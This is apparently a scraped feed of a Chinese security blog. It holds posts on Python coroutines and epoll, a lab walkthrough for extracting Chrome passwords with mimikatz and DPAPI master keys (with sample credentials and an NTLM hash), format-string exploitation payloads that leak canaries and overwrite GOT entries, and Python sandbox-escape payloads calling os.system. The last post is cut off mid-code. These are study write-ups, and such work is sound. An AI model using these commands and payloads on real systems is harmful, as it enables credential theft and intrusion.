这个prompt Python’s concurrency, particularly through coroutines, is a powerful feature that allows high concurrency with minimal overhead. Here’s a breakdown of the underlying principles: Understanding Coroutines: Coroutines are generalizations of subroutines. Unlike subroutines, coroutines can pause execution and return control to the caller, enabling tasks to be executed concurrently. This is aided by the asyncio library in Python, which provides a framework for writing single-threaded concurrent code using coroutines. Event Loop: At the heart of coroutine-based concurrency is the event loop. The event loop runs the registered tasks (coroutines) in an organized manner. It uses I/O multiplexing to manage tasks without the need for multiple threads or processes. Non-blocking I/O Operations: Coroutines efficiently manage I/O-bound and high-level structured network code through non-blocking operations. When a coroutine performs an I/O operation, other tasks can run. When the operation completes, the routine is resumed. Task Scheduling: Instead of creating a new thread for each task, the event loop schedules multiple tasks to run on the same thread. This lightweight task management means less overhead compared to threads and processes. Yielding Control: await expressions in coroutines are used to yield control back to the event loop, allowing other tasks to run. This cooperative multitasking reduces the complexity of managing context switches, unlike preemptive multitasking. Memory Efficiency: Coroutines are much more memory efficient compared to threads because they do not require their own stack. They work in the same address space, avoiding the need for context switching that is typical of thread-based concurrency. Concurrency Patterns: Advanced patterns like producer-consumer, pipelines, and fan-out/fan-in can be implemented using coroutines to effectively handle high concurrency scenarios with low latency. Understanding these principles helps you leverage Python’s concurrency through coroutines to achieve high throughput in applications with limited resources. 追问 I/O不被操作系统挂起的原因 “When a coroutine performs an I/O operation, other tasks can run. When the operation completes, the coroutine is resumed.” 假设这个包含协程的线程是A，其它线程比如一个UI的线程是B 它是怎么做到检测一个task在I/O然后切换到另一个task的，对于操作系统来说（比如linux）尽管它有很多task但是对于kernel来说就是只有一个线程。也就是说一个task在I/O的时候，内核会认为这个线程有I/O。这时候内核难道不是应该把这个包含协程的线程A挂起，切换其它的线程比如B进来执行吗？为什么会让这个协程继续执行后其他的task？ 在Python的协程模型中，特别是使用asyncio库时，协程的执行并不依赖于操作系统的线程调度。相反，它依赖于一个事件循环（event loop）来管理和调度任务。这意味着即使在单线程环境下，也可以通过协程实现并发。 事件循环和非阻塞I/O 事件循环：事件循环是协程并发的核心。它负责调度和执行协程任务。当一个协程遇到await表达式（通常是一个I/O操作）时，它会将控制权返回给事件循环，而不是阻塞线程。 非阻塞I/O：协程中的I/O操作是非阻塞的。这意味着，当一个协程等待I/O操作完成时，它不会阻塞整个线程。相反，事件循环会继续运行其他已准备好的协程。 内核和线程的交互 在操作系统层面（例如Linux），线程在执行I/O操作时会被标记为“可阻塞”状态。然而，Python的**asyncio库通过使用非阻塞I/O（例如，使用select、poll或epoll**等系统调用）来避免线程被阻塞。 当协程执行一个非阻塞I/O操作时，事件循环会注册这个操作，并继续执行其他任务。 一旦I/O操作完成，事件循环会收到通知，并恢复被挂起的协程。 协程与线程的区别 协程：在用户级别管理，依赖于事件循环进行调度。它们共享同一个线程，不需要操作系统的上下文切换，因此开销较小。 线程：由操作系统管理，涉及到内核级别的调度和上下文切换，开销较大。 线程A和线程B的关系 在你的例子中，线程A运行事件循环并调度协程任务，线程B可能运行其他任务（例如UI）。如果线程A中的协程在等待I/O，事件循环会继续调度其他协程，而不会被操作系统挂起。只有当线程A没有其他协程可以运行时，操作系统才可能将线程A挂起并调度其他线程（例如线程B）。 因此，通过这种方式，Python的协程能够在单线程环境中实现高效的并发，而不需要依赖多线程机制。 追问 select, poll, epoll的原理 使用 CompSciGPT computer science assistant 这个prompt In the realm of operating systems and network programming, handling multiple simultaneous I/O operations is crucial. This is where system calls like select, poll, and epoll come into play, particularly in environments like server development. Let’s explore the differences and use cases for each: Select Overview: select is one of the oldest I/O multiplexing options available in Unix-based systems. Functionality: It allows a program to monitor multiple file descriptors to see if any of them is ready for I/O (e.g., ready to read, write, or has an exceptional condition pending). Limitations: Scalability: It supports a limited number of file descriptors, typically 1024, though this is configurable in some systems. Performance: Every call to select requires the kernel to walk through the entire list of file descriptors to check their states, which can become inefficient for a large number of file descriptors. FD_SET Management: You must reset the file descriptor set for each call. Poll Overview: poll was introduced to overcome some of the select limitations. Functionality: Similar to select, but it uses a different approach to handle file descriptors, allowing a greater number. Advantages: No Hard Limit: Unlike select, poll does not have a hardcoded limit on the number of file descriptors it can monitor. Simplified Interface: Instead of managing multiple fd sets, poll uses a single array of pollfd structures. Limitations: Performance: Though better than select, it still requires iterating over the entire list of file descriptors, which can be computationally expensive as the number of descriptors grows. Epoll Overview: epoll is specific to Linux and designed to be more efficient and scalable than both select and poll. Functionality: It allows management of a large number of file descriptors with better performance characteristics. Advantages: Scalability: Ideal for applications with a high number of file descriptors (thousands or more). Efficiency: Uses a ready list instead of scanning all descriptors. The kernel tracks which file descriptors are “active,” which saves resources. Edge/Level Triggering: Offers two modes (edge-triggered and level-triggered) giving developers finer control over the handling of ready events. Persistent Interest: Once you register interest in certain events, epoll keeps the interest until explicitly changed or removed. Limitations: Complexity: Programming with epoll can be more complex, requiring a good understanding of its behavior, especially with edge-triggered semantics. Choosing the Right System Call Select: Rarely used in modern applications due to its limitations, but can be suitable for smaller, less demanding applications. Poll: A reasonable choice when you need more capability than select offers, without needing the complexity of epoll. Epoll: The preferred choice for high-performance server applications on Linux due to its scalability and efficient event notification handling. Practical Considerations When designing networked applications, especially servers, the choice between select, poll, and epoll can significantly impact performance. Understand the workload and environment specifics to make an informed decision. For example, cross-platform applications might prefer poll for its broader compatibility. Always consider the trade-offs between complexity and performance. While epoll offers great performance, it requires careful handling of edge cases in event management. In conclusion, a solid understanding of select, poll, and epoll not only helps in choosing the right tool for your application needs but also aids in optimizing the application’s performance in a networked infrastructure. select, poll, epoll代码 Certainly! Let’s modify the examples to demonstrate how to use select, poll, and epoll for file I/O operations. Since file operations are often simpler than networking operations, these examples will assume we’re using a non-blocking read operation on a file. Common Setup First, let’s ensure we have a file to work with: 12345678910111213#include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int setup_file(const char *filename) { int fd = open(filename, O_RDONLY | O_NONBLOCK); if (fd == -1) { perror(&quot;open&quot;); } return fd; } /**When you open a file with the O_NONBLOCK flag, it specifies that subsequent operations (like read or write) on the file descriptor should be non-blocking if they support non-blocking behavior. */ This setup_file function will open a file in non-blocking mode, which is essential for non-blocking I/O operations. Select Example with File I/O 12345678910111213141516171819202122232425262728293031323334353637#include &lt;sys/select.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { int fd = setup_file(&quot;example.txt&quot;); if (fd == -1) return 1; fd_set readfds; FD_ZERO(&amp;readfds); FD_SET(fd, &amp;readfds); struct timeval tv; tv.tv_sec = 5; // Wait for up to 5 seconds tv.tv_usec = 0; int retval = select(fd + 1, &amp;readfds, NULL, NULL, &amp;tv); if (retval == -1) { perror(&quot;select&quot;); } else if (retval) { if (FD_ISSET(fd, &amp;readfds)) { printf(&quot;File is ready for reading.\\n&quot;); // Read from the file char buffer[1024]; ssize_t bytes_read = read(fd, buffer, sizeof(buffer)); if (bytes_read &gt; 0) { printf(&quot;Read %zd bytes: %.*s\\n&quot;, bytes_read, (int)bytes_read, buffer); } } } else { printf(&quot;No data read within five seconds.\\n&quot;); } close(fd); return 0; } Poll Example with File I/O 12345678910111213141516171819202122232425262728293031323334#include &lt;poll.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { int fd = setup_file(&quot;example.txt&quot;); if (fd == -1) return 1; struct pollfd fds[1]; fds[0].fd = fd; fds[0].events = POLLIN; int retval = poll(fds, 1, 5000); // Wait for 5 seconds if (retval == -1) { perror(&quot;poll&quot;); } else if (retval &gt; 0) { if (fds[0].revents &amp; POLLIN) { printf(&quot;File is ready for reading.\\n&quot;); // Read from the file char buffer[1024]; ssize_t bytes_read = read(fd, buffer, sizeof(buffer)); if (bytes_read &gt; 0) { printf(&quot;Read %zd bytes: %.*s\\n&quot;, bytes_read, (int)bytes_read, buffer); } } } else { printf(&quot;No data read within five seconds.\\n&quot;); } close(fd); return 0; } Epoll Example with File I/O 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;sys/epoll.h&gt; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #define MAX_EVENTS 5 int main() { int fd = setup_file(&quot;example.txt&quot;); if (fd == -1) return 1; int epoll_fd = epoll_create1(0); if (epoll_fd == -1) { perror(&quot;epoll_create1&quot;); exit(EXIT_FAILURE); } struct epoll_event event; event.events = EPOLLIN; event.data.fd = fd; if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &amp;event) == -1) { perror(&quot;epoll_ctl&quot;); exit(EXIT_FAILURE); } struct epoll_event events[MAX_EVENTS]; int n = epoll_wait(epoll_fd, events, MAX_EVENTS, 5000); // Wait for 5 seconds if (n == -1) { perror(&quot;epoll_wait&quot;); exit(EXIT_FAILURE); } for (int i = 0; i &lt; n; i++) { if (events[i].data.fd == fd) { printf(&quot;File is ready for reading.\\n&quot;); // Read from the file char buffer[1024]; ssize_t bytes_read = read(fd, buffer, sizeof(buffer)); if (bytes_read &gt; 0) { printf(&quot;Read %zd bytes: %.*s\\n&quot;, bytes_read, (int)bytes_read, buffer); } } } close(epoll_fd); close(fd); return 0; } Explanation File Descriptor: Each example utilizes setup_file to open a file named example.txt in non-blocking mode. You need to ensure this file exists for these examples to work. Select, Poll, Epoll: These functions check if the file is ready for reading within a 5-second window. Reading from the File: Once data is available, the programs proceed to read it using read(). These examples demonstrate how non-blocking I/O operations can be handled for files using select, poll, and epoll, analogous to how they would be used for sockets. Does Select Map File Contents to Memory? No Direct Mapping: The select system call itself does not map file contents to memory. Its purpose is strictly to monitor the readiness of file descriptors for I/O operations. Content Access: It does not involve reading or writing file contents. Once select indicates that a file descriptor is ready, you still need to perform actual read or write operations on the file descriptor to access or modify content. For regular files opened with non-blocking flags, select can be used to check readiness, although it is most useful for scenarios where I/O operations may block, such as with network sockets or pipes. Regular file systems often support ready operations differently than sockets do, making non-blocking I/O and readiness a key concern for network and inter-process communications.","link":"/2024/08/21/%E4%B8%8EAI%E7%BA%B8%E4%B8%8A%E8%B0%88%E5%85%B5-Python%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8EI-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/"},{"title":"使用mimikatz导出chrome密码","text":"模拟场景 在获取某PC本地administrator的权限情况下，导出使用该PC机域普通账号的密码。 受害机ip：192.168.3.4 受害机账户： 本地管理员：administrator/toor 域普通账户：beta\\fengjie/qqq123!@# 加密机制简介 chrome储存的明文密码时使用windows提供的DPAPI进行对称加密来保证安全性。加解密的密钥称为master key。master key被用户登录密码、SID和16字节随机数加密后保存在Master Key file（%APPDATA%\\Microsoft\\Protect\\%SID%）中。 最简单的情况：A用户拖A自己的密码 12dpapi::chrome /in:'C:\\Users\\fengjie\\AppData\\Local\\Google\\Chrome\\UserData\\Default\\Login Data' /unprotect 在A用户登陆状态B解密A的chrome密码 在用户登陆状态下可以直接用procdump或者mimikatz直接从内存中获取master key。 1234privilege::debugsekurlsa::dpapipython wmiexec.py administrator:toor@192.168.3.4 'c:\\users\\public\\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit' 获取到masterkey 1230bf0be64d4dc768a543b3a12d7c5210d184c07a3861cad8f2bd8b7bbacc60fd0e06e955b6dad057d070d1ce3b2bb331fd8dbce6efad08808f1849e4f4ef26d801b81b1c9cb66a3f93b58f85948e8ce53779c6e5d 接下来用mimikatz一把梭就可以了 1python wmiexec.py administrator:toor@192.168.3.4 'cd c:\\users\\public &amp;&amp; Minimimini64.exe &quot;dpapi::chrome /in:\\&quot;C:\\Users\\fengjie\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\\&quot; /masterkey:1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d&quot; exit ' 最开始用wmiexec并未解密成功 后来发现是wmiexec的锅换成psexec就好了（用smbexec也可以，怀疑是因为用wmiexec时令牌完整性受限的原因，知道的师傅请教我一手） 在A用户离线状态B解密A的chrome密码 现在用mimikatz重新抓已经抓不到fengjie的master key了 用户明文密码已知 这种情况下有两种方法可以选择。 1.如果我们知道fengjie的明文密码，可以用runas降权(或者进行一些spwan的操作降权)，降权之后又回到了最简单的情况。（因为runas需要交互式shell，所以这种方法比较鸡肋） 123runas /user:fengjie@beta.com &quot;cmd.exe&quot;mimikatz dpapi::chrome /in:”%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies” /unprotect 2.在没有交互式的情况下可以直接用mimikatz直接算出master key。 1dpapi::masterkey /in:&quot;c:\\Users\\fengjie\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2274946182-2013957047-1890316882-1632\\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8&quot; /password:qqq123!@# 拿到master key后情况又相当于又转换回了用户在线的情景。 用户明文密码未知，知道NTLM hash 1dpapi::masterkey /in:&quot;c:\\Users\\fengjie\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2274946182-2013957047-1890316882-1632\\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8&quot; /hash:632f6adad4510099d676724bfb87c6ee 总结 简单的说就是三种情况 A用户获取自己chrome密码不需要知道master key A获取B用户，如果B用户在线，那么可以直接从内存中抓取出B的maste key A获取B用户，B不在线，就需要用b用户的明文密码或者NTLM hash计算出master key,在回到上面一步。 参考 渗透技巧——导出Chrome浏览器中保存的密码 渗透技巧——离线导出Chrome浏览器中保存的密码 渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码 Operational Guidance for Offensive User DPAPI Abuse [翻译]滥用User DPAPI进行攻击的操作指南","link":"/2019/12/09/%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E5%AF%86%E7%A0%81/"},{"title":"博客重启小记","text":"大约是在一七年那个寒假开始写技术博客，中间断断续续的更新到一八年六月。重新写博客是起于今年九月份的临时起意，一方面是想督促自己“有意识”的进步，另外一方面是假装做做技术输出。最开始博客用的是hexo，重启之后另起炉灶用是wordpress，因为并不想付云服务器月租所以决定换回hexo。在弃更到重启这段期间因为换过新笔记本并且再加上没有备份，所以之前的博客文章的md版已经灾难性的消失。大约花了一天多的时间慢慢把网页手工恢复成符合hexo格式的md（大概部分文章仍然会有格式上的错误），在整理的时候发现自己以前的文章表意不清，部分地方是片面甚至错误的（以后抽时间慢慢改，咕咕咕？）。以上～","link":"/2019/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0/"},{"title":"博客重启小记（2）","text":"有两年多年没有写博客了，最近一次写的话题还是weblogic RCE挖掘 《记一次失败的Weblogic IIOP Gadget挖掘》。虽然当时写的时候标题是“失败的”，但其实后面确实启发了另一位师傅拿到了RCE （CVE-2022-21420）。我要感谢这位师傅，不但因为它挽救了这次失败的利用，还因为它总是在过年的时候给我发红包，手动狗头。 安全研究是一门艺术，是守正出奇，是推陈出新，是对创造力的磨练。有一起研究技术的小伙伴是幸福的，感谢大学四年能遇到Syclover小组。 毕业后去了上海，又辗转香港，如今上坡两年了，准备第二次重启我的博客。未来准备更新一些学习binary和distributed system的学习笔记。 之前redteam.today域名已经被别人买走，以后打算长期用cl0und.github.io了。看到博客友链中能正常访问的已经所剩无几，这更让我到体会长期写博客的不易。希望这次我能坚持得更久一些😆 顺颂夏安。","link":"/2024/08/10/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0%EF%BC%882%EF%BC%89/"},{"title":"浮点数精度，printf，格式化字符串漏洞","text":"文中各种图片引用自不同的blog都附在参考链接里面了，侵删。 浮点数的存储 单精度浮点数 (single precision floating point) 的表示方式遵循 IEEE 754 标准。这种表示方式由32位组成： 1位用于符号位 (sign bit) 8位用于指数 (exponent) 23位用于尾数 (mantissa or significand) 双精度类似，此时指数位有11，尾数有52 手工转换的思路是分别把整数部分和小数部分换成二进制，然后缩放成1.X * 2^n的二进制版本科学计数法。此时 .X部分为尾数部分，n为阶码需要加上127，如果n为1那么指数位就是127+1 = 128。之所以会有这个规定，是为了考虑到n为负数的情况（只考虑正数的情况，十进制下小于1）。 下面以8.5存储为单精度为例 8.5 是正数，所以符号位为 0。 整数部分是 8，转换为二进制是 1000。 小数部分是 0.5。将其转换为二进制： 0.5 × 2 = 1.0，整数部分是 1 所以，0.5 的二进制是 0.1。 8.5 的二进制表示为 1000.1。 将二进制数表示为规范化形式：1.0001 × 2^3。 指数是 3，加上偏移量 127，得到 130。 130 的二进制表示为 10000010。 尾数是规范化形式中小数点后的部分：0001，补足到 23 位：00010000000000000000000 符号位 + 指数 + 尾数 = 0 10000010 00010000000000000000000。 浮点数的分类 当然其实上面介绍的只是浮点数的一种类型的求值方式：规格化浮点数。 浮点数有三种分类，这篇文章总结非常好直接抄过来 规格化浮点数 此时指数位范围是1至254，因此对应阶码的范围则为-126至127 尾数位是一个小于1的小数，在计算真实浮点数字的时候需要+1 （真实的尾数M = 1 + f）。相当于我们省掉了1位二进制，形成了浮点数表示的约定，默认尾数的值还有一个最高位的1。 非规格化浮点数， 指数位全为0 非规格化的方式与规格化不同，它不会对尾数进行加1的处理，也就是说，真实的尾数M = f。这是为了能够表示0这个数值，否则的话尾数总是大于1，那么无论如何都将得不到0这个数值。 特殊值 在阶码全为1时，如果尾数位全为0，则表示无穷大。符号位为0则表示正无穷大，相反则表示负无穷大。 倘若尾数位不全为0时，此时则表示NaN，表示不是一个数字。 这一点在Javascript当中有一个相关的函数与这个NaN的含义有点类似，它的作用是用来判断一个参数是否是一个数字。 由此可以看出来，浮点数的取值范围。 举个例子非规格化浮点数（考虑单精度，正数） 非规格化数的最小值 = 2^-23 * 2^-126 = 2 ^ -149 非格式化数最大值 = (2^-1 + 2^-2 + … + 2 ^ -23)* 2^-126 = (1−2^-23) * 2^-126 引用结论 通过上面的分析可以发现，尽管浮点数表示的范围很广，但由于精度损失的存在，加上幂次的放大作用，一个浮点数实际上是表示了周围的一个有理数区间。如果将浮点数绘制到一个数轴上，直观上看，靠近0的部分，浮点数出现较密集。越靠近无穷大，浮点数分布越稀疏，一个浮点值代表了周围一片数据。从这个意义上来说，浮点数不宜直接比较相等，它们是代表了一个数据范围。实际应用中，如果要使用浮点数计算，一定要考虑精度问题。在满足精度要求的前提下，计算结果才是有效的。 在计算精度要求情形下，例如商业计算等，应该避免使用浮点数，严格采取高精度计算。 再啰嗦一句，帮助理解，也就是这里非规格化数的最小值2 ^ -149代表了 0到2 ^ -149之间的所有正数。 浮点数的精度 单精度浮点数的精度主要由尾数部分决定。由于尾数有23位，加上隐含的1位，总共有24位的有效数字。 现在，我们来计算这 24 位二进制数可以表示多少位十进制有效数字：log₁₀(2²⁴) ≈ 7.22 这意味着单精度浮点数理论上可以精确表示大约 7位十进制有效数字，这里再对有效数字做一个定义 非零数字总是有效数字。 在非零数字之间的零是有效数字。 小数点左边的前导零不是有效数字。 小数点右边的尾随零可能是有效数字，这取决于测量的精度 再看prinf 抄这篇文章的题目，读者可以思考一下输出是什么。 123456789101112131415161718192021222324#include &lt;stdio.h&gt;int main(void){ int a = 4; int b = 3; int c = a/b; float d = *(float*)(&amp;c); long long e = 0xffffffffffffffff; printf(&quot;a/b:%f，a:%d\\n&quot;,a/b,a,b); //打印0 printf(&quot;(float)a/b:%f\\n&quot;,((float)a)/b); //打印1 printf(&quot;(double)a/b:%lf\\n&quot;,((double)a)/b);//打印2 printf(&quot;d:%f\\n&quot;,d); //打印3 printf(&quot;%.*f\\n&quot;,20,(double)a/b); //打印4 printf(&quot;e:%d,a:%d\\n&quot;,e,a); //打印5 printf(&quot;a:%d,++a:%d,a++:%d\\n&quot;,a,++a,a++); //打印6 return 0;} 运行的结果是 1234567a/b:0.000000，a:1(float)a/b:1.333333(double)a/b:1.333333d:0.0000001.33333333333333325932e:-1,a:4a:6,++a:6,a++:4 第一次看到这个题的时候，感觉很奇怪，printf(&quot;a/b:%f，a:%d\\n&quot;,a/b,a,b); 。这里格式化字符串里面只有两位，为什么要传入三个参数。 所以这里我们主要关注打印0-2涉及到的知识点 每个参数执行“默认实际参数提升” 提升规则如下: float将提升到double char、short和相应的signed、unsigned类型将提升到int printf实际上只会接受到double，int，long int等类型的参数。而从来不会实际接受到float，char，short等类型参数。 我们gdb调试结果来佐证一下。 格式化字符串漏洞 先来看一下prinf支持的各种参数 %d 或 %i：整数 %u：无符号整数 %f：浮点数 %x：十六进制整数（小写） %X：十六进制整数（大写） %o：八进制整数 %s：字符串 %c：字符 %p：指针地址 %n：写入的字符数 格式化字符串泄漏栈上内存数据 这种套路，一般用%08x, %p来泄漏栈上数据。举一个leak cannary的例子。 1234567#include &lt;stdio.h&gt;void main() { char buf[50]; if(fgets(buf, sizeof buf, stdin) == NULL) return; printf(buf);} 1gcc -g -Wall -fstack-protector-all -o program_with_canary program.c Cannary会被从QWORD PTR fs:0x28放到栈上，然后我们用%p来读，一个%p读8字节的内存。 实际需要多少个可以通过gdb或静态分析来算。这里给用14个就行了。 格式化字符串泄漏任意地址数据 这种套路一般用来泄漏got表数据，先构想读地址的值在栈上，然后调用%s去读这个地址。 因为这个地址需要在栈上，所以这里为方便用32位程序演示。这个值肯定和printf的第一个参数有一些偏移。所以最后我们需要用%n$s这种“加强版”的%s去读到偏移。 1gcc -g -m32 -Wall -fno-stack-protector -o vulnerable_program program.c 先来读一下GOT表 12readelf -r vulnerable_program | grep fget0804c010 00000207 R_386_JUMP_SLOT 00000000 fgets@GLIBC_2.0 和刚才思路类似，先用以一坨%p看一下偏移 1AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p 这里AAAA被断开了，所以我们还需要padding一下 1PPAAAA%p %p %p %p %p %p %p %p %p %p %p %p %p %p 所以我只需要用%8$s即可以读到GOT表地址 1python3 -c 'import sys; sys.stdout.buffer.write(b&quot;PP\\x10\\xc0\\x04\\x08%8$s\\n&quot;)' 12b mainrun &lt; text 格式化字符串向任意地址写入数据 这种要结合%n来利用，先来看一下%n的用法。 1234567#include &lt;stdio.h&gt;void main() { int i; printf(&quot;AAAA%n\\n&quot;, &amp;i); printf(&quot;%d\\n&quot;, i);} printf解析到%n会把输出的字符串的长度放在i中。 在漏洞利用中，类似于我们用\\x10\\xc0\\x04\\x08%8$s去偏移8处读\\x10\\xc0\\x04\\x08地址的值。我门用\\x10\\xc0\\x04\\x08%8$n去偏移8处的\\x10\\xc0\\x04\\x08地址写入打印出来的字符个数。这样我们只要控制打印字数就可以控制任意地址的值了。 1python3 -c 'import sys; sys.stdout.buffer.write(b&quot;PP\\x10\\xc0\\x04\\x08%8$n\\n&quot;)' 修改前 p *0x0804c010 修改后 这里我们只输出六个字符，太少了。实际利用肯定要写入一个地址(比如one gadget的地址)，这个地址一般都很大比如0x80c0ffff，所以需要结合printf的对齐语法来写入大值。 假设第10个偏移是0x0804c010，那我们理论上就可以把地址0x0804c010写入0x08ffffff的值 1python3 -c 'import sys; sys.stdout.buffer.write(b&quot;%150994943d%12$nAA\\x10\\xc0\\x04\\x08\\n&quot;)' &gt; te 在输出大量padding过后成功修改完地址 这种方法简单粗暴，但更优雅的方式是逐字节修改。 依次对0804c010写入0xff，0804c011写入0xff，0804c012写入0xff，0804c013写入0x08 附 non pie 与 ASLR 程序是no pie的就算操作系统开了ASLR也没用？ ASLR（Address Space Layout Randomization）： 这是一个操作系统级别的安全特性。 它随机化进程的内存布局，包括堆、栈、共享库的加载位置等。 PIE（Position Independent Executable）： 这是一个编译时的选项。 它使可执行文件的代码段也能被随机化。 ASLR 和 no-PIE 的组合效果： 如果程序是 no-PIE 的（非位置独立可执行文件），但操作系统开启了 ASLR： 程序的代码段（.text）将会在固定的地址加载。 但是，堆、栈、共享库等仍然会被随机化。 附 python字符集的坑 123parallels@parallels-Parallels-Virtual-Platform:~/Desktop$ python3 -c 'print(&quot;PP\\x10\\xc0\\x04\\x08%7$s&quot;)' &gt; textparallels@parallels-Parallels-Virtual-Platform:~/Desktop$ cat text |xxd00000000: 5050 10c3 8004 0825 3724 730a PP.....%7$s. 参考 https://blog.csdn.net/dreamer2020/article/details/24158303 https://www.yanbinghu.com/2018/12/02/10796.html https://www.cnblogs.com/jillzhang/archive/2007/06/24/793901.html https://blog.csdn.net/weixin_42250302/article/details/108287860 https://www.cnblogs.com/zuoxiaolong/p/computer11.html https://github.com/firmianay/CTF-All-In-One/blob/master/SUMMARY.md","link":"/2024/08/31/%E6%B5%AE%E7%82%B9%E6%95%B0%E7%B2%BE%E5%BA%A6%EF%BC%8Cprintf%EF%BC%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"},{"title":"用python继承链搞事情","text":"前言 继承链这个这个词是我自己发明的。看到有的师傅博客中将它称为egg或者ssti，但是我喜欢叫它继承链因为感觉很生动。最早遇到这种姿势是在学习python bypass沙盒的时候。当时不是很理解形如().__class__.__bases__[0].__subclasses__()的意思。学习一段时间后，我决定来总结一下构造继承链的方法，并且用此方法在django有格式化字符串漏洞的情况下读取配置文件（灵感来自p师傅博客）。 基础知识 bases 返回一个类直接所继承的类（元组形式） 12345678910111213141516class Base1: def __init__(self): passclass Base2: def __init__(self): passclass test(Base1, Base2): passclass test2(test): passprint test.__bases__print test2.__bases__&quot;&quot;&quot;(&lt;class __main__.Base1 at 0x0322ADF8&gt;, &lt;class __main__.Base2 at 0x0322AE30&gt;)(&lt;class __main__.test at 0x0322AE68&gt;,)&quot;&quot;&quot; 在看别人文章时发现__mro__和__bases__用法相同，两者具体区别， 暂时留个坑。 一些情况下也可用__base__直接返回单个的类 class 12345678class Base: def __init__(self): passobj = Base()print obj.__class__&quot;&quot;&quot;__main__.Base&quot;&quot;&quot; 返回一个实例所属的类 globals 123456789101112#coding:utf-8import osvar = 2333def fun(): passclass test: def __init__(self): passprint test.__init__.__globals__&quot;&quot;&quot;{'__builtins__': &lt;module '__builtin__' (built-in)&gt;, '__file__': 'backup.py', '__package__': None, 'fun': &lt;function fun at 0x7f542e44b5f0&gt;, 'test': &lt;class __main__.test at 0x7f542e43b598&gt;, 'var': 2333, '__name__': '__main__', 'os': &lt;module 'os' from '/usr/lib/python2.7/os.pyc'&gt;, '__doc__': None}&quot;&quot;&quot; 使用方式是 函数名.__globals__，返回一个当前空间下能使用的模块，方法和变量的字典。 Untitled subclasses() 获取一个类的子类，返回的是一个列表 123456789class Base1(object): def __init__(self): passclass test(Base1): passprint Base1.__subclasses__()&quot;&quot;&quot;[&lt;class '__main__.test'&gt;]&quot;&quot;&quot; builtin &amp;&amp; builtins python中可以直接运行一些函数，例如int(),list()等等。这些函数可以在__builtins__中可以查到。查看的方法是dir(__builtins__)。在控制台中直接输入__builtins__会看到如下情况 123#python2&gt;&gt;&gt; __builtins__&lt;module '__builtin__' (built-in)&gt; ps：在py3中__builtin__被换成了builtin __builtin__ 和 __builtins__之间是什么关系呢？ 1、在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__，二者完全是一个东西，不分彼此。 2、非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身 继承链bypass沙盒 用file对象读取文件 构造继承链的一种思路是： 随便找一个内置类对象用__class__拿到他所对应的类 用__bases__拿到基类（&lt;class 'object'&gt;） 用__subclasses__()拿到子类列表 在子类列表中直接寻找可以利用的类 一言敝之 12().__class__.__base__.__subclasses__()().__class__.__bases__[0].__subclasses__() 可以看到列表里面有一坨，这里只看file对象。 1[...,&lt;type 'file'&gt;, ...] 查找file位置。 1234567#coding:utf-8search = 'file'num = 0for i in ().__class__.__bases__[0].__subclasses__(): if 'file' in str(i): print num num += 1 &lt;type 'file'&gt;在第40位。().__class__.__bases__[0].__subclasses__()[40] 用dir来看看内置的方法 1dir(().__class__.__bases__[0].__subclasses__()[40]) 1['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines'] 所以最终的payload是 1().__class__.__bases__[0].__subclasses__()[40]('filename').readlines() 然后用同样的手法可以得到__mro__形式下的payload 1().__class__.__mro__[1].__subclasses__()[40]('filename').readlines() 这种方法等价于 1file('backup.py').readlines() 但是python3已经移除了file。所以第一种方法只能在py2中用。 用内置模块执行命令 第二种方法接着第一种的思路接着探索。第一种止步于把内置的对象列举出来，其实可以用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等），万一有os这种东西就赚了。 1234567891011121314#coding:utf-8search = 'os' #也可以是其他你想利用的模块num = -1for i in ().__class__.__bases__[0].__subclasses__(): num += 1 try: if search in i.__init__.__globals__.keys(): print(i, num) except: pass &quot;&quot;&quot;(&lt;class 'site._Printer'&gt;, 72)(&lt;class 'site.Quitter'&gt;, 77)&quot;&quot;&quot; 12().__class__.__mro__[1].__subclasses__()[77].__init__.__globals__['os'].system('whoami')().__class__.__mro__[1].__subclasses__()[72].__init__.__globals__['os'].system('whoami') 不过很可惜上述的方法也只能在py2中使用。 第三种 那有没有通吃py2和py3的方法呢？答案是有的，就用上面__builtins__来搞事。 1234567891011121314#coding:utf-8search = '__builtins__'num = -1for i in ().__class__.__bases__[0].__subclasses__(): num += 1 try: if search in 